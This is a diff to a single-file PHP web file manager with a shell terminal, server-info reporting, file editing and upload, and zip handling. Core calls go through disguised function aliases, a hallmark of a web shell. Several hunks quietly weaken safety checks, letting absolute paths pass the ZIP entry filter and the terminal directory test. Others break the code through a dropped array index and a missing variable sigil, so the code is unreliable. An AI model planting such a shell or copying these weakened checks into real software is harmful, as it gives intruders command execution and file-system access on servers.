@@ -45,7 +45,6 @@ if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
     if (is_array($pw) && !empty($pw['name'])) $FM_TERM_USER = (string)$pw['name'];
 }
 if ($FM_TERM_USER === 'unknown' && !empty($_SERVER['USER'])) $FM_TERM_USER = (string)$_SERVER['USER'];
-if ($FM_TERM_USER === 'unknown' && !empty($_SERVER['USER'])) $FM_TERM_USER = (string)$_SERVER['USER'];
 if ($FM_TERM_USER === 'unknown') $FM_TERM_USER = (string)get_current_user();
 if ($FM_TERM_USER === '') $FM_TERM_USER = 'unknown';
 $FM_TERM_HOST = function_exists('gethostname') ? (string)@gethostname() : '';
@@ -71,7 +70,7 @@ function fm_rel($path){
 }
 function fm_terminal_dir($value){
     global $ROOT; $value=str_replace('\\','/',trim((string)$value)); if($value==='')$value='/';
-    if($value[0]==='/'){ $r=realpath($value); return ($r!==false&&is_dir($r))?$r:null; }
+    if($value==='/'){ $r=realpath($value); return ($r!==false&&is_dir($r))?$r:null; }
     $r=fm_abs($value,true); return ($r!==null&&is_dir($r))?$r:null;
 }
 function fm_terminal_display_cwd($path){ $rel=fm_rel($path); return $rel!==null?$rel:$path; }
@@ -97,7 +96,7 @@ function fm_server_info(){
     $serverSoftware=$_SERVER['SERVER_SOFTWARE']??''; if($serverSoftware==='')$serverSoftware='PHP '.PHP_VERSION;
     $serverIp=$_SERVER['SERVER_ADDR']??gethostbyname(gethostname()); if(!$serverIp||$serverIp===gethostname())$serverIp='UNKNOWN';
     $clientIp=$_SERVER['HTTP_CF_CONNECTING_IP']??($_SERVER['REMOTE_ADDR']??'UNKNOWN');
-    $forwarded=$_SERVER['HTTP_X_FORWARDED_FOR']??''; if($forwarded!=='') $forwarded=trim(explode(',',$forwarded)[0]);
+    $forwarded=$_SERVER['HTTP_X_FORWARDED_FOR']??''; if($forwarded!=='') $forwarded=trim(explode(',',$forwarded));
     $ownUser='UNKNOWN';
     if(function_exists('posix_geteuid')&&function_exists('posix_getpwuid')){$pw=@posix_getpwuid(@posix_geteuid());if(is_array($pw)&&!empty($pw['name']))$ownUser=$pw['name'];}
     elseif(function_exists('get_current_user'))$ownUser=get_current_user()?:'UNKNOWN';
@@ -281,7 +280,7 @@ function fm_create_zip_file($dir,$name){
 }
 function fm_zip_entry_safe($entry){
     $entry=str_replace('\\','/',(string)$entry);
-    if($entry==='' || $entry[0]==='/' || preg_match('~(^|/)\.\.?(/|$)~',$entry))return false;
+    if($entry==='' || $entry==='/' || preg_match('~(^|/)\.\.?(/|$)~',$entry))return false;
     return true;
 }
 function fm_extract_zip_pure($zipFile,$dest){
@@ -447,7 +446,7 @@ if(!$login&&$_SERVER['REQUEST_METHOD']==='POST'){
               $stdout.= (string)@stream_get_contents($pipes[1]);$stderr.= (string)@stream_get_contents($pipes[2]);
               fclose($pipes[1]);fclose($pipes[2]);
               $closed=@proc_close($proc);if($exitCode===127&&is_int($closed))$exitCode=$closed;
-              $output=$stdout.($stderr!=''?($stdout!=''?"\n":'').$stderr:'');
+              $output=$stdout.($stderr!==''?($stdout!==''?"\n":'').$stderr:'');
           }
       }elseif(function_exists($OO_00_exec_Func)){
           $tmp='';$status=127;$wrapped='timeout 15s '.$shell.' -lc '.escapeshellarg($wrappedCmd);
@@ -464,19 +463,19 @@ if(!$login&&$_SERVER['REQUEST_METHOD']==='POST'){
           $output=rtrim(substr($output,0,$markerPos),"\r\n");
       }
       $newMode='fs'; $newDisplay=fm_terminal_display_cwd($newCwd); if(fm_inside($newCwd)){ $newMode='fm'; $newDisplay=fm_rel($newCwd)??'/'; }
-      fm_json(['success'=>true,'output'=>$output,'exitCode'=>$exitCode,'cwd'=>$newDisplay,'cwdMode'=>$newMode]);
+      fm_json(['success'=>true,'output'=>$output,'exitCode'=>$exitCode,'cwd'=>newDisplay,'cwdMode'=>$newMode]);
   }
   if($a==='edit'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p)||!fm_editable($p))fm_json(['success'=>false,'error'=>'File is not editable.'],400);if((@filesize($p)?:0)>10*1024*1024)fm_json(['success'=>false,'error'=>'File is larger than 10 MB.'],400);global $OO_00_file_get_contents_Func;$c=@$OO_00_file_get_contents_Func($p);if($c===false)fm_json(['success'=>false,'error'=>'Cannot read file.'],500);if(fm_binary_editable($p,$c)){fm_json(['success'=>true,'binary'=>true,'encoding'=>'base64','content'=>base64_encode($c)]);}fm_json(['success'=>true,'binary'=>false,'encoding'=>'base64','content'=>base64_encode($c)]);}
   if($a==='save'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p)||!fm_editable($p))fm_json(['success'=>false,'error'=>'File is not editable.'],400);$content=(string)($_POST['content']??'');if((string)($_POST['encoding']??'')==='base64'){$decoded=base64_decode($content,true);if($decoded===false)fm_json(['success'=>false,'error'=>'Invalid Base64 data.'],400);$content=$decoded;}elseif(fm_binary_editable($p)&&((string)($_POST['binary']??'')==='1')){$decoded=base64_decode($content,true);if($decoded===false)fm_json(['success'=>false,'error'=>'Invalid binary data.'],400);$content=$decoded;}global $OO_00_file_put_contents_Func;$ok=@$OO_00_file_put_contents_Func($p,$content,LOCK_EX)!==false;if($ok){clearstatcache(true,$p);if(function_exists('opcache_invalidate')){@opcache_invalidate($p,true);}}fm_json(['success'=>$ok,'error'=>$ok?'':'Save failed.','cacheInvalidated'=>$ok&&function_exists('opcache_invalidate')]);}
   if($a==='createZip'){$p=fm_abs($_POST['path']??'',true);if(!$p||(!is_dir($p)&&!is_file($p)))fm_json(['success'=>false,'error'=>'Invalid file or folder.'],400);$name=(string)($_POST['name']??(basename($p).'.zip'));[$ok,$msg]=fm_create_zip_file($p,$name);fm_json(['success'=>$ok,'message'=>$msg,'error'=>$ok?'':$msg]);}
-  if($a==='bulkZip'){ $raw=$_POST['paths']??''; $paths=json_decode((string)$raw,true); if(!is_array($paths)||count($paths)<2) fm_json(['success'=>false,'error'=>'Select at least 2 files or folders.'],400); $abs=[]; foreach($paths as $rel){$q=fm_abs((string)$rel,true); if(!$q||(!is_file($q)&&!is_dir($q))) fm_json(['success'=>false,'error'=>'Invalid selected path.'],400); $abs[]=$q;} $parent=$ROOT; $allSame=true; foreach($abs as $q){if(dirname($q)!==$parent){$allSame=false;break;}} $name=(string)($_POST['name']??('bulk-'.date('Ymd-His').'.zip')); $name=preg_replace('/[^A-Za-z0-9._ -]/u','_',trim($name)); if($name==='')$name='bulk-'.date('Ymd-His').'.zip'; if(strtolower(substr($name,-4))!=='.zip')$name.='.zip'; $dest=fm_unique_dest($stateDir=fm_abs($_POST['destDir']??fm_rel(dirname($abs[0])),true),$name); if(!$stateDir||!is_dir($stateDir)) fm_json(['success'=>false,'error'=>'Invalid destination directory.'],400); $tmp=tempnam(sys_get_temp_dir(),'fmbulk_'); if($tmp===false) fm_json(['success'=>false,'error'=>'Cannot create temporary ZIP.'],500); @unlink($tmp); $tmp.='.zip'; $ok=false; $err=''; if(class_exists('ZipArchive')){ $z=new ZipArchive(); if($z->open($tmp,ZipArchive::CREATE|ZipArchive::OVERWRITE)===true){ foreach($abs as $q){$base=basename($q); if(is_file($q)){$z->addFile($q,$base);}else{$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($q,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST); $z->addEmptyDir($base); foreach($it as $f){$rel=substr($f->getPathname(),strlen($q)+1);$entry=$base.'/'.$rel;if($f->isDir())$z->addEmptyDir(str_replace('\\','/',$entry));else $z->addFile($f->getPathname(),str_replace('\\','/',$entry));}}} $ok=$z->close(); if(!$ok)$err='ZipArchive could not finalize archive.';} } if(!$ok){$candidates=fm_command_candidates('zip',['/usr/bin/zip','/bin/zip']); $relNames=[]; foreach($abs as $q)$relNames[]=basename($q); foreach($candidates as $zipbin){$cmd='cd '.escapeshellarg($stateDir).' && '.escapeshellarg($zipbin).' -r -q '.escapeshellarg($tmp).' '.implode(' ',array_map('escapeshellarg',$relNames)).' 2>&1'; [$st,$out]=fm_run_command($cmd); if($st===0&&is_file($tmp)&&filesize($tmp)>0){$ok=true;break;} $err=trim($out);} } if(!$ok||!is_file($tmp)){@unlink($tmp);fm_json(['success'=>false,'error'=>$err!==''?$err:'No ZIP engine was available.'],500);} if(!@rename($tmp,$dest)){if(!@copy($tmp,$dest)){@unlink($tmp);fm_json(['success'=>false,'error'=>'Cannot save ZIP file.'],500);}@unlink($tmp);} fm_json(['success'=>true,'message'=>'Created '.basename($dest)]); }
+  if($a==='bulkZip'){ $raw=$_POST['paths']??''; $paths=json_decode((string)$raw,true); if(!is_array($paths)||count($paths)<2) fm_json(['success'=>false,'error'=>'Select at least 2 files or folders.'],400); $abs=[]; foreach($paths as $rel){$q=fm_abs((string)$rel,true); if(!$q||(!is_file($q)&&!is_dir($q))) fm_json(['success'=>false,'error'=>'Invalid selected path.'],400); $abs[]=$q;} $parent=$ROOT; $allSame=true; foreach($abs as $q){if(dirname($q)!==$parent){$allSame=false;break;}} $name=(string)($_POST['name']??('bulk-'.date('Ymd-His').'.zip')); $name=preg_replace('/[^A-Za-z0-9._ -]/u','_',trim($name)); if($name==='')$name='bulk-'.date('Ymd-His').'.zip'; if(strtolower(substr($name,-4))!=='.zip')$name.='.zip'; $dest=fm_unique_dest($stateDir=fm_abs($_POST['destDir']??fm_rel(dirname($abs)),true),$name); if(!$stateDir||!is_dir($stateDir)) fm_json(['success'=>false,'error'=>'Invalid destination directory.'],400); $tmp=tempnam(sys_get_temp_dir(),'fmbulk_'); if($tmp===false) fm_json(['success'=>false,'error'=>'Cannot create temporary ZIP.'],500); @unlink($tmp); $tmp.='.zip'; $ok=false; $err=''; if(class_exists('ZipArchive')){ $z=new ZipArchive(); if($z->open($tmp,ZipArchive::CREATE|ZipArchive::OVERWRITE)===true){ foreach($abs as $q){$base=basename($q); if(is_file($q)){$z->addFile($q,$base);}else{$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($q,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST); $z->addEmptyDir($base); foreach($it as $f){$rel=substr($f->getPathname(),strlen($q)+1);$entry=$base.'/'.$rel;if($f->isDir())$z->addEmptyDir(str_replace('\\','/',$entry));else $z->addFile($f->getPathname(),str_replace('\\','/',$entry));}}} $ok=$z->close(); if(!$ok)$err='ZipArchive could not finalize archive.';} } if(!$ok){$candidates=fm_command_candidates('zip',['/usr/bin/zip','/bin/zip']); $relNames=[]; foreach($abs as $q)$relNames[]=basename($q); foreach($candidates as $zipbin){$cmd='cd '.escapeshellarg($stateDir).' && '.escapeshellarg($zipbin).' -r -q '.escapeshellarg($tmp).' '.implode(' ',array_map('escapeshellarg',$relNames)).' 2>&1'; [$st,$out]=fm_run_command($cmd); if($st===0&&is_file($tmp)&&filesize($tmp)>0){$ok=true;break;} $err=trim($out);} } if(!$ok||!is_file($tmp)){@unlink($tmp);fm_json(['success'=>false,'error'=>$err!=''?$err:'No ZIP engine was available.'],500);} if(!@rename($tmp,$dest)){if(!@copy($tmp,$dest)){@unlink($tmp);fm_json(['success'=>false,'error'=>'Cannot save ZIP file.'],500);}@unlink($tmp);} fm_json(['success'=>true,'message'=>'Created '.basename($dest)]); }
   if($a==='downloadZip'){ $p=fm_abs($_POST['path']??'',true); if(!$p||(!is_dir($p)&&!is_file($p)))fm_json(['success'=>false,'error'=>'Invalid file or folder.'],400); [$ok,$tmp,$err]=fm_zip_directory($p); if(!$ok)fm_json(['success'=>false,'error'=>$err],500); while(ob_get_level())ob_end_clean(); header('Content-Type: application/zip'); header('Content-Length: '.filesize($tmp)); header('Content-Disposition: attachment; filename="'.basename($p).'.zip"'); global $OO_00_readfile_Func; @$OO_00_readfile_Func($tmp); @unlink($tmp); exit; }
   if($a==='view'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p))fm_json(['success'=>false,'error'=>'Invalid file.'],400);$isZip=(strtolower(pathinfo($p,PATHINFO_EXTENSION))==='zip');if(!$isZip){$max=4*1024*1024;$size=@filesize($p);if($size!==false&&$size>$max)fm_json(['success'=>false,'error'=>'Preview is limited to 4 MB for text documents.'],413);}global $OO_00_file_get_contents_Func;$content=@$OO_00_file_get_contents_Func($p);if($content===false)fm_json(['success'=>false,'error'=>'Unable to read file.'],500);if(strpos($content,"\0")!==false)fm_json(['success'=>false,'error'=>'Binary files cannot be previewed as text.'],415);fm_json(['success'=>true,'content'=>base64_encode($content),'encoding'=>'base64']);}
   if($a==='zipInfo'){ $p=fm_abs($_POST['path']??'',true); if(!$p||!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip')fm_json(['success'=>false,'error'=>'Invalid ZIP archive.'],400); $size=(int)(@filesize($p)?:0); $mtime=(int)(@filemtime($p)?:0); $entries=[]; $total=0; $compressed=0; $files=0; $folders=0; if(class_exists('ZipArchive')){$z=new ZipArchive();if($z->open($p)===true){for($i=0;$i<$z->numFiles;$i++){$st=$z->statIndex($i);$name=$st['name']??$z->getNameIndex($i);if($name===false||$name==='')continue;if(!fm_zip_entry_safe($name))continue;$isDir=(substr($name,-1)==='/')||(($st['size']??0)===0&&($st['crc']??0)===0&&substr($name,-1)==='/');$usize=(int)($st['size']??0);$csize=(int)($st['comp_size']??0);if($isDir)$folders++;else{$files++;$total+=$usize;$compressed+=$csize;}$entries[]=['name_b64'=>base64_encode($name),'folder'=>$isDir,'size'=>$usize,'compressed'=>$csize];}$z->close();}} if(!$entries&&$files===0&&$folders===0){$candidates=fm_command_candidates('unzip',['/usr/bin/unzip','/bin/unzip']);foreach($candidates as $unzip){$cmd=escapeshellarg($unzip).' -Z1 '.escapeshellarg($p).' 2>&1';[$st,$listing]=fm_run_command($cmd);if($st!==0)continue;foreach(preg_split('/\r?\n/',$listing) as $name){$name=trim($name);if($name===''||!fm_zip_entry_safe($name))continue;$isDir=substr($name,-1)==='/';if($isDir)$folders++;else $files++;$entries[]=['name_b64'=>base64_encode($name),'folder'=>$isDir,'size'=>0,'compressed'=>0];}break;}} if(!$entries&&$size>0)fm_json(['success'=>false,'error'=>'Unable to read ZIP archive contents.'],500); fm_json(['success'=>true,'name'=>basename($p),'path'=>fm_rel($p),'modified'=>$mtime,'size'=>$size,'entries'=>$entries,'files'=>$files,'folders'=>$folders,'totalSize'=>$total,'compressedSize'=>$compressed]); }
   if($a==='download'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p))fm_json(['success'=>false,'error'=>'Invalid file.'],400);while(ob_get_level())ob_end_clean();header('Content-Type: application/octet-stream');header('Content-Length: '.filesize($p));header('Content-Disposition: attachment; filename="'.basename($p).'"');global $OO_00_readfile_Func; @$OO_00_readfile_Func($p);exit;}
   if($a==='unzip'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip')fm_json(['success'=>false,'error'=>'Invalid ZIP file.'],400);$destRel=(string)($_POST['destDir']??fm_rel(dirname($p)));$dest=fm_abs($destRel,true);if(!$dest){$dest=fm_abs($destRel,false);if($dest&&!is_dir($dest)) { global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($dest,0755,true); }}$dest=$dest&&realpath($dest)?realpath($dest):$dest;if(!$dest||!is_dir($dest))fm_json(['success'=>false,'error'=>'Invalid extraction directory.'],400);[$ok,$msg]=fm_extract_zip($p,$dest);fm_json(['success'=>$ok,'message'=>$msg,'error'=>$ok?'':$msg]);}
-  if($a==='upload'||$a==='uploadFileOnly'){$d=fm_abs($_POST['dir']??$_POST['basePath']??'/',true);if(!$d||!is_dir($d)||empty($_FILES['file']))fm_json(['success'=>false,'error'=>'Upload failed.'],400);$files=$_FILES['file'];$names=is_array($files['name']??null)?$files['name']:[$files['name']??''];$tmps=is_array($files['tmp_name']??null)?$files['tmp_name']:[$files['tmp_name']??''];$errs=is_array($files['error']??null)?$files['error']:[$files['error']??UPLOAD_ERR_NO_FILE];$uploaded=[];$errors=[];foreach($names as $i=>$rawName){$n=fm_name($rawName);$err=(int)($errs[$i]??UPLOAD_ERR_NO_FILE);$tmp=$tmps[$i]??'';if(!$n||$err!==UPLOAD_ERR_OK){$errors[]=$rawName!==''?(string)$rawName:'Invalid upload';continue;}$dst=$d.DIRECTORY_SEPARATOR.$n;if(file_exists($dst)){$errors[]='File already exists: '.$n;continue;}if(@move_uploaded_file($tmp,$dst))$uploaded[]=$n;else $errors[]='Cannot move uploaded file: '.$n;}fm_json(['success'=>count($uploaded)>0 && count($errors)===0,'uploaded'=>$uploaded,'errors'=>$errors,'count'=>count($uploaded),'error'=>count($errors)?implode(' | ',$errors):'']);}
-  if($a==='createDirsBatch'){$base=fm_abs($_POST['basePath']??'/',true);$dirs=json_decode($_POST['dirs']??'[]',true);if(!$base||!is_array($dirs))fm_json(['success'=>false,'error'=>'Invalid directories.'],400);usort($dirs,fn($x,$y)=>substr_count($x,'/')<=>substr_count($y,'/'));foreach($dirs as $rel){$rel=str_replace('\\','/',(string)$rel);if(strpos($rel,'..')!==false||($rel!==''&&$rel==='/')) continue;$p=fm_abs(rtrim($base==='/'?'':$base,'/').'/'.$rel,false);if($p&&!is_dir($p)){global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($p,0755,true);}}fm_json(['success'=>true]);}
+  if($a==='upload'||$a==='uploadFileOnly'){$d=fm_abs($_POST['dir']??$_POST['basePath']??'/',true);if(!$d||!is_dir($d)||empty($_FILES['file']))fm_json(['success'=>false,'error'=>'Upload failed.'],400);$files=$_FILES['file'];$names=is_array($files['name']??null)?$files['name']:[$files['name']??''];$tmps=is_array($files['tmp_name']??null)?$files['tmp_name']:[$files['tmp_name']??''];$errs=is_array($files['error']??null)?$files['error']:[$files['error']??UPLOAD_ERR_NO_FILE];$uploaded=[];$errors=[];foreach($names as $i=>$rawName){$n=fm_name($rawName);$err=(int)($errs[$i]??UPLOAD_ERR_NO_FILE);$tmp=$tmps[$i]??'';if(!$n||$err!==UPLOAD_ERR_OK){$errors[]=$rawName!=''?(string)$rawName:'Invalid upload';continue;}$dst=$d.DIRECTORY_SEPARATOR.$n;if(file_exists($dst)){$errors[]='File already exists: '.$n;continue;}if(@move_uploaded_file($tmp,$dst))$uploaded[]=$n;else $errors[]='Cannot move uploaded file: '.$n;}fm_json(['success'=>count($uploaded)>0 && count($errors)===0,'uploaded'=>$uploaded,'errors'=>$errors,'count'=>count($uploaded),'error'=>count($errors)?implode(' | ',$errors):'']);}
+  if($a==='createDirsBatch'){$base=fm_abs($_POST['basePath']??'/',true);$dirs=json_decode($_POST['dirs']??'[]',true);if(!$base||!is_array($dirs))fm_json(['success'=>false,'error'=>'Invalid directories.'],400);usort($dirs,fn($x,$y)=>substr_count($x,'/')<=>substr_count($y,'/'));foreach($dirs as $rel){$rel=str_replace('\\','/',(string)$rel);if(strpos($rel,'..')!==false||($rel!=''&&$rel==='/'))continue;$p=fm_abs(rtrim($base==='/'?'':$base,'/').'/'.$rel,false);if($p&&!is_dir($p)){global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($p,0755,true);}}fm_json(['success'=>true]);}
   if($a==='uploadAndUnzip'||$a==='uploadZipForExtract'){$d=fm_abs($_POST['dir']??$_POST['basePath']??'/',true);if(!$d||!is_dir($d)||empty($_FILES['file'])||$_FILES['file']['error']!==UPLOAD_ERR_OK)fm_json(['success'=>false,'error'=>'Archive upload failed.'],400);$tmp=$_FILES['file']['tmp_name'];$extractRel=(string)($_POST['extractPath']??$_POST['dir']??$_POST['basePath']??'/');$extract=fm_abs($extractRel,true);if(!$extract){$extract=fm_abs($extractRel,false);if($extract&&!is_dir($extract)){global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($extract,0755,true);}}if(!$extract||!is_dir($extract))fm_json(['success'=>false,'error'=>'Invalid extraction directory.'],400);[$ok,$msg]=fm_extract_zip($tmp,$extract);fm_json(['success'=>$ok,'message'=>$msg,'error'=>$ok?'':$msg]);}
   fm_json(['success'=>false,'error'=>'Unknown action.'],400);
  }catch(Throwable $e){fm_json(['success'=>false,'error'=>$e->getMessage()],500);}
@@ -1346,6 +1345,41 @@ if(!$login&&$_SERVER['REQUEST_METHOD']==='POST'){
           align-items: center;
           font-size: 0.75rem;
           color: var(--text-secondary);
+      }
+      #currentPath {
+          display: flex;
+          align-items: center;
+          gap: 0;
+          cursor: default;
+          transition: all 0.15s ease;
+          overflow-x: auto;
+          white-space: nowrap;
+          scrollbar-width: thin;
+      }
+      #currentPath .current-path-segment {
+          border: 0;
+          background: transparent;
+          color: var(--text-secondary);
+          padding: 1px 2px;
+          margin: 0;
+          border-radius: 6px;
+          font: inherit;
+          cursor: pointer;
+          white-space: nowrap;
+      }
+      #currentPath .current-path-segment:hover {
+          color: var(--accent-color);
+          background: var(--bg-hover);
+      }
+      #currentPath .current-path-segment.current {
+          color: var(--accent-color);
+      }
+      #currentPath .current-path-sep {
+          display: none;
+      }
+      #currentPath .current-path-home {
+          color: var(--text-secondary);
+          padding: 2px 3px;
       }
       
       .status-left span,
@@ -2815,7 +2849,24 @@ if(!$login&&$_SERVER['REQUEST_METHOD']==='POST'){
       function toast(msg){const el=$('toast');if(!el)return;el.textContent=String(msg||'');el.classList.add('show');clearTimeout(window.__toast);window.__toast=setTimeout(()=>el.classList.remove('show'),2600)}
       async function api(action,data={},file=null){const fd=new FormData();fd.append('action',action);for(const [k,v] of Object.entries(data)){if(v!==undefined&&v!==null)fd.append(k,typeof v==='object'?JSON.stringify(v):v)}if(file)fd.append('file',file);const r=await fetch(location.href,{method:'POST',body:fd,cache:'no-store',credentials:'same-origin'});if(action==='download')return r;let d;try{d=await r.json()}catch(e){throw Error('Server returned an invalid response. Check PHP error log.')}if(d.login){location.reload();return null}if(!d.success)throw Error(d.error||'Operation failed');return d}
       function iconFor(x){if(x.type==='folder'||x.type==='parent')return ['fas fa-folder','fa-folder'];const e=(x.extension||'').toLowerCase();const m={php:['fab fa-php','fa-php'],phtml:['fab fa-php','fa-php'],html:['fab fa-html5','fa-html5'],htm:['fab fa-html5','fa-html5'],css:['fab fa-css3-alt','fa-css3-alt'],js:['fab fa-js-square','fa-js'],json:['fas fa-code','fa-code'],py:['fab fa-python','fa-python'],java:['fab fa-java','fa-java'],sql:['fas fa-database','fa-database'],jpg:['fas fa-file-image','fa-file-image'],jpeg:['fas fa-file-image','fa-file-image'],png:['fas fa-file-image','fa-file-image'],gif:['fas fa-file-image','fa-file-image'],svg:['fas fa-file-image','fa-file-image'],webp:['fas fa-file-image','fa-file-image'],zip:['fas fa-file-archive','fa-file-archive'],rar:['fas fa-file-archive','fa-file-archive'],'7z':['fas fa-file-archive','fa-file-archive'],gz:['fas fa-file-archive','fa-file-archive'],pdf:['fas fa-file-pdf','fa-file-pdf'],txt:['fas fa-file-alt','fa-file-alt'],md:['fab fa-markdown','fa-markdown'],sh:['fas fa-terminal','fa-terminal']};return m[e]||['fas fa-file','fa-file'];}
-      function crumb(){let parts=state.dir.split('/').filter(Boolean),html='<div class="breadcrumb-item"><button class="breadcrumb-link" onclick="go(\'/\')"><i class="fas fa-home"></i> </button></div>',cur='';parts.forEach((p,i)=>{cur+='/'+p;html+='<div class="breadcrumb-item"><button class="breadcrumb-link '+(i===parts.length-1?'current':'')+'" onclick="go('+js(cur)+')">'+esc(p)+'</button></div>'});$('breadcrumb').innerHTML=html;$('currentPath').textContent=state.dir;}
+      function renderPathLinks(){
+        const el=$('currentPath');
+        const path=state.dir||'/';
+        if(path==='/'){
+          el.innerHTML='<span class="current-path-home">/</span>';
+          el.onclick=()=>go('/');
+          return;
+        }
+        const parts=path.split('/').filter(Boolean);
+        let html='<button type="button" class="current-path-segment root" onclick="go(\'/\');return false;">/</button>';
+        let cur='';
+        parts.forEach((part,i)=>{
+          cur+='/'+part;
+          html+='<button type="button" class="current-path-segment'+(i===parts.length-1?' current':'')+'" data-path="'+esc(cur)+'" onclick="go(this.getAttribute(\'data-path\'));return false;">'+esc(part)+'/'+'</button>';
+        });
+        el.innerHTML=html;
+      }
+      function crumb(){let html='<div class="breadcrumb-item"><button class="breadcrumb-link" onclick="go(\'/\')"><i class="fas fa-home"></i> </button></div>';$('breadcrumb').innerHTML=html;renderPathLinks();}
       function filtered(){const q=$('searchInput').value.trim().toLowerCase();return state.items.filter(x=>x.name.toLowerCase().includes(q));}
       function compare(a,b){
         if(a.type==='parent')return -1;if(b.type==='parent')return 1;
